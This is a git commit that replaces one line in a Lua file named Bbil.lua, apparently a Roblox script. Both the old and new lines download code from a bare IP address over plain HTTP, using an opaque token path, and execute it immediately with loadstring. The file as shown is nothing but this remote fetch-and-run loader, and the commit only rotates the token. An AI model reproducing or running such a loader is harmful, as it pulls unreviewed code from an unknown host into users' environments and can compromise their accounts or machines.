80797958c1a066f55066a716216e552c9b1a0c78
TakZ-bit <tak72086@gmail.com>
2026-09-01 23:55:39 +0630

    Update Bbil.lua

--- Bbil.lua
+++ Bbil.lua
@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("http://31.172.87.116/MCHXIAKQOD1yz8TOaeOis8mQkKvn0gmEpGWd2tHNO4OT4yatOwD30Vt8zaBvrA02NTi78siepS00rxmU"))()
+loadstring(game:HttpGet("http://31.172.87.116/Wb2faHMH7AqnspBMEvKDVywQrXezKfNRROrUbeDjQjdgbiJEodYWXGCepjxozTjvFF6qt2LHujQDXh0S"))()
